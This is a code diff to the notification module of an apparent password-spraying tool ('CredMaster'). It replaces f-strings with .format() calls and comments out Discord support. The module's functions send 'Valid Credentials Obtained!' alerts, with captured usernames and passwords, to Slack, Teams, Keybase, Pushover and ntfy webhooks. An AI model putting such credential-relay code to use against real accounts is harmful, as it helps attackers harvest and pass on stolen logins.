@@ -1,6 +1,6 @@
 import requests, json
 from datetime import datetime
-from discordwebhook import Discord
+# from discordwebhook import Discord
 
 
 def notify_success(username, password, notify_obj):
@@ -26,8 +26,8 @@ def notify_success(username, password, notify_obj):
     if ntfy_topic is not None and ntfy_host is not None:
         ntfy_notify(username, password, operator, exclude_password, ntfy_topic, ntfy_host, ntfy_token)
 
-    if discord_webhook is not None:
-        discord_notify(username, password, operator, exclude_password, discord_webhook)
+    # if discord_webhook is not None:
+    #    discord_notify(username, password, operator, exclude_password, discord_webhook)
 
     if teams_webhook is not None:
         teams_notify(username, password, operator, exclude_password, teams_webhook)
@@ -58,8 +58,8 @@ def notify_update(message, notify_obj):
     if ntfy_topic is not None and ntfy_host is not None:
         ntfy_update(message, operator, ntfy_topic, ntfy_host, ntfy_token)
 
-    if discord_webhook is not None:
-        discord_update(message, operator, discord_webhook)
+    # if discord_webhook is not None:
+    #    discord_update(message, operator, discord_webhook)
 
     if teams_webhook is not None:
         teams_update(message, operator, teams_webhook)
@@ -77,18 +77,18 @@ def keybase_notify(username, password, operator, exclude_password, webhook):
 
     op_insert = ""
     if operator is not None:
-        op_insert = f"Operator: {operator}\n"
+        op_insert = "Operator: {}\n".format(operator)
 
-    pwd_insert = f"Pass: {password}\n"
+    pwd_insert = "Pass: {}\n".format(password)
     if exclude_password:
         pwd_insert = ""
 
     text = ("```[Valid Credentials Obtained!]\n"
-            f"{op_insert}"
-            f"User: {username}\n"
-            f"{pwd_insert}"
-            f"Date: {date}\n"
-            f"Time: {time}```")
+            "{}"
+            "User: {}\n"
+            "{}"
+            "Date: {}\n"
+            "Time: {}```".format(op_insert, username, pwd_insert, date, time))
 
     message = {
         "msg" : text
@@ -109,13 +109,13 @@ def keybase_update(message, operator, webhook):
 
     op_insert = ""
     if operator is not None:
-        op_insert = f"Operator: {operator}\n"
+        op_insert = "Operator: {}\n".format(operator)
 
     text = ("```[Log Entry]\n"
-            f"{op_insert}"
-            f"{message}\n"
-            f"Date: {date}\n"
-            f"Time: {time}```")
+            "{}"
+            "{}\n"
+            "Date: {}\n"
+            "Time: {}```".format(op_insert, message, date, time))
 
     message = {
         "msg" : text
@@ -136,18 +136,18 @@ def slack_notify(username, password, operator, exclude_password, webhook):
 
     op_insert = ""
     if operator is not None:
-        op_insert = f"Operator: {operator}\n"
+        op_insert = "Operator: {}\n".format(operator)
 
-    pwd_insert = f"Pass: {password}\n"
+    pwd_insert = "Pass: {}\n".format(password)
     if exclude_password:
         pwd_insert = ""
 
     text = ("```[Valid Credentials Obtained!]\n"
-            f"{op_insert}"
-            f"User: {username}\n"
-            f"{pwd_insert}"
-            f"Date: {date}\n"
-            f"Time: {time}```")
+            "{}"
+            "User: {}\n"
+            "{}"
+            "Date: {}\n"
+            "Time: {}```".format(op_insert, username, pwd_insert, date, time))
 
     message = {
         "text" : text
@@ -168,13 +168,13 @@ def slack_update(message, operator, webhook):
 
     op_insert = ""
     if operator is not None:
-        op_insert = f"Operator: {operator}\n"
+        op_insert = "Operator: {}\n".format(operator)
 
     text = ("```[Log Entry]\n"
-            f"{op_insert}"
-            f"{message}\n"
-            f"Date: {date}\n"
-            f"Time: {time}```")
+            "{}"
+            "{}\n"
+            "Date: {}\n"
+            "Time: {}```".format(op_insert, message, date, time))
 
     message = {
         "text" : text
@@ -186,50 +186,50 @@ def slack_update(message, operator, webhook):
 
 
 # Function for posting username/password to Discord
-def discord_notify(username, password, operator, exclude_password, webhook):
+# def discord_notify(username, password, operator, exclude_password, webhook):
 
-    now = datetime.now()
-    date=now.strftime("%d-%m-%Y")
-    time=now.strftime("%H:%M:%S")
+    # now = datetime.now()
+    # date=now.strftime("%d-%m-%Y")
+    # time=now.strftime("%H:%M:%S")
 
-    op_insert = ""
-    if operator is not None:
-        op_insert = f"Operator: {operator}\n"
+    # op_insert = ""
+    # if operator is not None:
+        # op_insert = "Operator: {}\n".format(operator)
 
-    pwd_insert = f"Pass: {password}\n"
-    if exclude_password:
-        pwd_insert = ""
+    # pwd_insert = "Pass: {}\n".format(password)
+    # if exclude_password:
+        # pwd_insert = ""
 
-    text = ("```[Valid Credentials Obtained!]\n"
-            f"{op_insert}"
-            f"User: {username}\n"
-            f"{pwd_insert}"
-            f"Date: {date}\n"
-            f"Time: {time}```")
+    # text = ("```[Valid Credentials Obtained!]\n"
+            # "{}"
+            # "User: {}\n"
+            # "{}"
+            # "Date: {}\n"
+            # "Time: {}```".format(op_insert, username, pwd_insert, date, time))
 
-    discord = Discord(url=webhook)
-    discord.post(content=text)
+    # discord = Discord(url=webhook)
+    # discord.post(content=text)
 
 
 # Discord notify message
-def discord_update(message, operator, webhook):
+# def discord_update(message, operator, webhook):
 
-    now = datetime.now()
-    date=now.strftime("%d-%m-%Y")
-    time=now.strftime("%H:%M:%S")
+    # now = datetime.now()
+    # date=now.strftime("%d-%m-%Y")
+    # time=now.strftime("%H:%M:%S")
 
-    op_insert = ""
-    if operator is not None:
-        op_insert = f"Operator: {operator}\n"
+    # op_insert = ""
+    # if operator is not None:
+        # op_insert = "Operator: {}\n".format(operator)
 
-    text = ("```[Log Entry]\n"
-            f"{op_insert}"
-            f"{message}\n"
-            f"Date: {date}\n"
-            f"Time: {time}```")
+    # text = ("```[Log Entry]\n"
+            # "{}"
+            # "{}\n"
+            # "Date: {}\n"
+            # "Time: {}```".format(op_insert, message, date, time))
 
-    discord = Discord(url=webhook)
-    discord.post(content=text)
+    # discord = Discord(url=webhook)
+    # discord.post(content=text)
 
 
 # Teams notify function
@@ -241,17 +241,17 @@ def teams_notify(username, password, operator, exclude_password, webhook):
 
     op_insert = ""
     if operator is not None:
-        op_insert = f"Operator: {operator}\n"
+        op_insert = "Operator: {}\n".format(operator)
 
-    pwd_insert = f"Pass: {password}\n"
+    pwd_insert = "Pass: {}\n".format(password)
     if exclude_password:
         pwd_insert = ""
     content = ("[Valid Credentials Obtained!]\n"
-            f"{op_insert}"
-            f"User: {username}\n"
-            f"{pwd_insert}"
-            f"Date: {date}\n"
-            f"Time: {time}")
+            "{}"
+            "User: {}\n"
+            "{}"
+            "Date: {}\n"
+            "Time: {}".format(op_insert, username, pwd_insert, date, time))
     response = requests.post(
         url=webhook,
         headers={"Content-Type": "application/json"},
@@ -259,7 +259,7 @@ def teams_notify(username, password, operator, exclude_password, webhook):
             "summary": "[Valid Credentials Obtained!]",
             "sections": [{
                 "activityTitle": "CredMaster Bot",
-                "activitySubtitle": f"{content}"
+                "activitySubtitle": "{}".format(content)
             }],
         },
     )
@@ -273,13 +273,13 @@ def teams_update(message, operator, webhook):
 
     op_insert = ""
     if operator is not None:
-        op_insert = f"Operator: {operator}\n"
+        op_insert = "Operator: {}\n".format(operator)
 
     content = ("[Log Entry]\n"
-        f"{op_insert}"
-        f"Message: {message}\n"
-        f"Date: {date}\n"
-        f"Time: {time}")
+        "{}"
+        "Message: {}\n"
+        "Date: {}\n"
+        "Time: {}".format(op_insert, message, date, time))
     response = requests.post(
         url=webhook,
         headers={"Content-Type": "application/json"},
@@ -287,7 +287,7 @@ def teams_update(message, operator, webhook):
             "summary": "[Log Entry!]",
             "sections": [{
                 "activityTitle": "CredMaster Bot",
-                "activitySubtitle": f"{content}"
+                "activitySubtitle": "{}".format(content)
             }],
         },
     )
@@ -304,17 +304,17 @@ def pushover_notify(username, password, operator, exclude_password, token, user)
 
     op_insert = ""
     if operator is not None:
-        op_insert = f"Operator: {operator}\n"
+        op_insert = "Operator: {}\n".format(operator)
 
-    pwd_insert = f"Pass: {password}\n"
+    pwd_insert = "Pass: {}\n".format(password)
     if exclude_password:
         pwd_insert = ""
 
-    text = (f"{op_insert}"
-            f"User: {username}\n"
-            f"{pwd_insert}"
-            f"Date: {date}\n"
-            f"Time: {time}")
+    text = ("{}"
+            "User: {}\n"
+            "{}"
+            "Date: {}\n"
+            "Time: {}".format(op_insert, username, pwd_insert, date, time))
 
     data = {
         'token' : token,
@@ -338,12 +338,12 @@ def pushover_update(message, operator, token, user):
 
     op_insert = ""
     if operator is not None:
-        op_insert = f"Operator: {operator}\n"
+        op_insert = "Operator: {}\n".format(operator)
 
-    text = (f"{op_insert}"
-            f"{message}\n"
-            f"Date: {date}\n"
-            f"Time: {time}")
+    text = ("{}"
+            "{}\n"
+            "Date: {}\n"
+            "Time: {}".format(op_insert, message, date, time))
 
     data = {
         'token' : token,
@@ -364,17 +364,17 @@ def ntfy_notify(username, password, operator, exclude_password, topic, host, tok
 
     op_insert = ""
     if operator is not None:
-        op_insert = f"Operator: {operator}\n"
+        op_insert = "Operator: {}\n".format(operator)
 
-    pwd_insert = f"Pass: {password}\n"
+    pwd_insert = "Pass: {}\n".format(password)
     if exclude_password:
         pwd_insert = ""
 
-    text = (f"{op_insert}"
-            f"User: {username}\n"
-            f"{pwd_insert}"
-            f"Date: {date}\n"
-            f"Time: {time}")
+    text = ("{}"
+            "User: {}\n"
+            "{}"
+            "Date: {}\n"
+            "Time: {}".format(op_insert, username, pwd_insert, date, time))
 
     headers = {
         "Title": "Valid Credentials Obtained!",
@@ -397,12 +397,12 @@ def ntfy_update(message, operator, topic, host, token):
 
     op_insert = ""
     if operator is not None:
-        op_insert = f"Operator: {operator}\n"
+        op_insert = "Operator: {}\n".format(operator)
 
-    text = (f"{op_insert}"
-            f"{message}\n"
-            f"Date: {date}\n"
-            f"Time: {time}")
+    text = ("{}"
+            "{}\n"
+            "Date: {}\n"
+            "Time: {}".format(op_insert, message, date, time))
 
     headers = {
         "Title": "Log Entry!",
